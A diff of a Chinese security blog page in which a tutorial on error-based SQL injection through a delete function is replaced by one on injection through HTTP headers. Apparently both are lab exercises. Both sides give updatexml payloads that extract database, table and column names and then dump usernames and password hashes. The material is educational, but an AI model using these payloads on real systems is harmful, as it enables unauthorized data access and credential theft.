@@ -16,23 +16,23 @@
   <meta name="author" content="liaoyue">
   <meta name="keywords" content="">
   
-    <meta name="description" content="报错注入——delete型1.查看界面&amp;emsp;&amp;emsp;登录界面:    &amp;emsp;&amp;emsp;很明显，并没有反馈的东西，我们尝试点击留言内容    &amp;emsp;&amp;emsp;当我们输入内容时，会直接传送到留言板中，也没有显示位置，但是留意有删除选项，查看是否为注入点 &amp;emsp; 2.点击删除&amp;emsp;&amp;emsp;删除后界面：    &amp;emsp;&amp;emsp;可以看见“11”的内容被删除了">
+    <meta name="description" content="SQL注入——HTTP头型0.前言&amp;emsp;&amp;emsp;由于后台开发人员有时为了能够验证客户端登录的相关信息（比如网页的Cookie值验证）或者通过HTTP头用相关函数（SERVER）获取客户端的一些信息（比如QQ的登录定位等） &amp;emsp;&amp;emsp;由于HTTP所使用的函数语句存在变量传送至数据库当中并使用了SQL语句进行处理，从而导致了SQL注入有机可乘 1234#$_SERVER详解$_">
 <meta property="og:type" content="article">
-<meta property="og:title" content="报错注入——delete型">
-<meta property="og:url" content="https://one-null-pointer.github.io/2022/08/14/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/index.html">
+<meta property="og:title" content="SQL注入——HTTP头型">
+<meta property="og:url" content="https://one-null-pointer.github.io/2022/08/15/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/index.html">
 <meta property="og:site_name" content="one-null-poniter">
-<meta property="og:description" content="报错注入——delete型1.查看界面&amp;emsp;&amp;emsp;登录界面:    &amp;emsp;&amp;emsp;很明显，并没有反馈的东西，我们尝试点击留言内容    &amp;emsp;&amp;emsp;当我们输入内容时，会直接传送到留言板中，也没有显示位置，但是留意有删除选项，查看是否为注入点 &amp;emsp; 2.点击删除&amp;emsp;&amp;emsp;删除后界面：    &amp;emsp;&amp;emsp;可以看见“11”的内容被删除了">
+<meta property="og:description" content="SQL注入——HTTP头型0.前言&amp;emsp;&amp;emsp;由于后台开发人员有时为了能够验证客户端登录的相关信息（比如网页的Cookie值验证）或者通过HTTP头用相关函数（SERVER）获取客户端的一些信息（比如QQ的登录定位等） &amp;emsp;&amp;emsp;由于HTTP所使用的函数语句存在变量传送至数据库当中并使用了SQL语句进行处理，从而导致了SQL注入有机可乘 1234#$_SERVER详解$_">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://one-null-pointer.github.io/img/web1.png">
-<meta property="article:published_time" content="2022-08-14T05:24:12.000Z">
-<meta property="article:modified_time" content="2022-08-15T13:29:29.307Z">
+<meta property="article:published_time" content="2022-08-15T13:21:38.000Z">
+<meta property="article:modified_time" content="2022-08-15T13:29:53.816Z">
 <meta property="article:author" content="liaoyue">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://one-null-pointer.github.io/img/web1.png">
   
   
   
-  <title>报错注入——delete型 - one-null-poniter</title>
+  <title>SQL注入——HTTP头型 - one-null-poniter</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -185,7 +185,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="报错注入——delete型"></span>
+            <span id="subtitle" data-typed-text="SQL注入——HTTP头型"></span>
           
         </div>
 
@@ -196,8 +196,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-14 13:24" pubdate>
-          August 14, 2022 pm
+        <time datetime="2022-08-15 21:21" pubdate>
+          August 15, 2022 pm
         </time>
       </span>
     
@@ -208,7 +208,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.3k words
+          2.1k words
         
       </span>
     
@@ -219,7 +219,7 @@
         
         
         
-          11 mins
+          18 mins
         
       </span>
     
@@ -257,80 +257,89 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">报错注入——delete型</h1>
+            <h1 style="display: none">SQL注入——HTTP头型</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="报错注入——delete型"><a href="#报错注入——delete型" class="headerlink" title="报错注入——delete型"></a>报错注入——delete型</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;登录界面:</p>
-<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/1.jpg" srcset="/img/loading.gif" lazyload style="zoom:67%;" />
-</center>
+                <h1 id="SQL注入——HTTP头型"><a href="#SQL注入——HTTP头型" class="headerlink" title="SQL注入——HTTP头型"></a>SQL注入——HTTP头型</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;由于后台开发人员有时为了能够验证客户端登录的相关信息（比如网页的Cookie值验证）或者通过HTTP头用相关函数（SERVER）获取客户端的一些信息（比如QQ的登录定位等）</p>
+<p>&emsp;&emsp;由于HTTP所使用的函数语句存在变量传送至数据库当中并使用了SQL语句进行处理，从而导致了SQL注入有机可乘</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#$_SERVER详解</span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]       <span class="hljs-comment">//浏览器语言 </span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]               <span class="hljs-comment">//当前用户 IP</span><br><span class="hljs-comment">#其余的相关内容可以参考网站：https://www.cainiaoxueyuan.com/bc/9910.html</span><br></code></pre></td></tr></table></figure>
 
-<p>&emsp;&emsp;很明显，并没有反馈的东西，我们尝试点击留言内容</p>
-<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/2.jpg" srcset="/img/loading.gif" lazyload style="zoom:67%;" />
-</center>
 
-<p>&emsp;&emsp;当我们输入内容时，会直接传送到留言板中，也没有显示位置，但是留意有删除选项，查看是否为注入点</p>
-<p>&emsp;</p>
-<h4 id="2-点击删除"><a href="#2-点击删除" class="headerlink" title="2.点击删除"></a>2.点击删除</h4><p>&emsp;&emsp;删除后界面：</p>
-<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/3.jpg" srcset="/img/loading.gif" lazyload style="zoom:67%;" />
-</center>
 
-<p>&emsp;&emsp;可以看见“11”的内容被删除了，明显这就是在通过删除修改数据库内容，这是一个接入点，抓取报文进行尝试</p>
-<p>&emsp;</p>
-<h4 id="3-分析报文"><a href="#3-分析报文" class="headerlink" title="3.分析报文"></a>3.分析报文</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/4.jpg" srcset="/img/loading.gif" lazyload style="zoom:67%;" />
-</center>
-
-<p>&emsp;&emsp;在报文中存在传送id值，这明显是数字类型，所以后续不用加入单引号进行注入，首先尝试了一下联合注入，但由于没有回显位，所以是肯定不行的。（需要注意，这里是GET传送，所以要使用URL的编码格式！！！）</p>
-<p>&emsp;</p>
-<h4 id="4-使用updatexml函数获取数据库名"><a href="#4-使用updatexml函数获取数据库名" class="headerlink" title="4.使用updatexml函数获取数据库名"></a>4.使用updatexml函数获取数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
-
-<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/5.jpg" srcset="/img/loading.gif" lazyload style="zoom:60%;" />
+<p>&emsp;&emsp;</p>
+<h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;登录界面与提示：</p>
+<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/1.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
 </center>
 
 
-<p>&emsp;</p>
-<h4 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(database())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
 
-<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/6.jpg" srcset="/img/loading.gif" lazyload style="zoom:60%;" />
-</center>
-
-
-<p>&emsp;&emsp;有缺失，说明长度不够长，使用substr函数</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(database())),<span class="hljs-number">32</span>,<span class="hljs-number">31</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)) <br></code></pre></td></tr></table></figure>
-
-<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/7.jpg" srcset="/img/loading.gif" lazyload style="zoom:60%;" />
-</center>
-
-
-<p>&emsp;</p>
-<h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
-
-<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/8.jpg" srcset="/img/loading.gif" lazyload style="zoom:60%;" />
-</center>
-
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">32</span>,<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
-
-<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/9.jpg" srcset="/img/loading.gif" lazyload style="zoom:60%;" />
+<p>&emsp;&emsp;登录出现错误画面：</p>
+<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/2.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
 </center>
 
 <p>&emsp;</p>
-<h4 id="7-获取表中的内容"><a href="#7-获取表中的内容" class="headerlink" title="7.获取表中的内容"></a>7.获取表中的内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(username))<span class="hljs-keyword">from</span>(users)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
-
-<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/10.jpg" srcset="/img/loading.gif" lazyload style="zoom:60%;" />
+<h4 id="2-正确登录"><a href="#2-正确登录" class="headerlink" title="2.正确登录"></a>2.正确登录</h4><p>&emsp;&emsp;查看提示显示，给了我们登录的账号和密码，登入：</p>
+<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/3.jpg" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
 </center>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(password))<span class="hljs-keyword">from</span>(users)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
-
-<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/11.jpg" srcset="/img/loading.gif" lazyload style="zoom:60%;" />
+<p>&emsp;</p>
+<h4 id="3-报文分析3"><a href="#3-报文分析3" class="headerlink" title="3.报文分析3"></a>3.报文分析3</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/4.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
 </center>
+
+<p>&emsp;&emsp;在上面的内容中，我们可以看见，当登录成功后，反馈出了我们的ip地址、使用浏览器类型和相关的端口等信息，这明显涉及到了之前在请求注入类型中的http头类型，在反馈的浏览器类型中加入单引号查看是否存在注入点：</p>
+<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/5.jpg" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
+</center>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Chrome/<span class="hljs-number">99.0</span>.<span class="hljs-number">4844.51</span> Safari/<span class="hljs-number">537.36</span> <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;通过反馈的内容提示可以看见（have an error in your SQL syntax），这说明存在SQL注入的漏洞，由于没有回显位置，所以尝试采用报错注入。</p>
+<h4 id="4-使用updatexml函数获取数据库名"><a href="#4-使用updatexml函数获取数据库名" class="headerlink" title="4.使用updatexml函数获取数据库名"></a>4.使用updatexml函数获取数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,database(),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/6.jpg" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
+</center>
+
+<p>&emsp;&emsp;注入方式依旧是updatexml老方法</p>
+<p>&emsp;&emsp;</p>
+<h4 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or(updatexml(0x7e,concat(0x7e,(select(group_concat(table_name)) from (information_schema.tables)where(table_schema)like(database())),0x7e),0x7e))or&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/7.jpg" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
+</center>
+
+<p>&emsp;&emsp;经典不够长，继续使用substr，其实limit也能用（但是我懒得重新写语句了）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),32,31),0x7e),1)) or&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/8.jpg" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
+</center>
+
+<p>&emsp;</p>
+<h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;  or (updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>users<span class="hljs-string">&#x27;)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/9.jpg" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
+</center>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>users<span class="hljs-string">&#x27;)),32,32),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/10.jpg" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
+</center>
+
+<p>&emsp;</p>
+<h4 id="7-获取表中的内容"><a href="#7-获取表中的内容" class="headerlink" title="7.获取表中的内容"></a>7.获取表中的内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,(select(group_concat(username))from(users)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/11.jpg" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
+</center>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,(select(group_concat(password))from(users)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure>
 
 <p>&emsp;</p>
 <h4 id="8-解码"><a href="#8-解码" class="headerlink" title="8.解码"></a>8.解码</h4><p>&emsp;&emsp;“MD5的码，请阅读SQL——数字型”</p>
 <center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/1.png" srcset="/img/loading.gif" lazyload style="zoom:150%;" />
 </center>
 
-
+<p>&emsp;</p>
+<h4 id="9-总结"><a href="#9-总结" class="headerlink" title="9.总结"></a>9.总结</h4><p>&emsp;&emsp;对于报错注入的三种类型演示就结束 了，接下来将是布尔类型和时间类型的注入了，在报错注入的学习中，还是有疑问的，比如在HTTP头中，为什么注入语句在内容前面能够注入成功，在内容的后面反而提示数据类型错误，还没想明白，很多博客上只说能注入就没了，说和前面的报错注入一样，我觉得是肤浅的,对于不同的类型而言，肯定有新的东西和应该注意的地方</p>
+<p>&emsp;&emsp;以及应该有注意到，在前面的update类型中，用or的注入不成功，用and却成功了，这在逻辑上我无法理解，但是总归是试出来了，看来还有很长的路要去走呀！</p>
 
                 
               </div>
@@ -369,8 +378,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>报错注入——delete型</div>
-      <div>https://one-null-pointer.github.io/2022/08/14/SQL注入——delete型/</div>
+      <div>SQL注入——HTTP头型</div>
+      <div>https://one-null-pointer.github.io/2022/08/15/SQL注入——HTTP头型/</div>
     </div>
     <div class="license-meta">
       
@@ -382,7 +391,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 14, 2022</div>
+          <div>August 15, 2022</div>
         </div>
       
       
@@ -412,18 +421,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/08/15/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94HTTP%E5%A4%B4%E5%9E%8B/" title="SQL注入——HTTP头型">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">SQL注入——HTTP头型</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/08/13/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/" title="报错注入——update型">
-                        <span class="hidden-mobile">报错注入——update型</span>
+                      <a href="/2022/08/14/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/" title="报错注入——delete型">
+                        <span class="hidden-mobile">报错注入——delete型</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
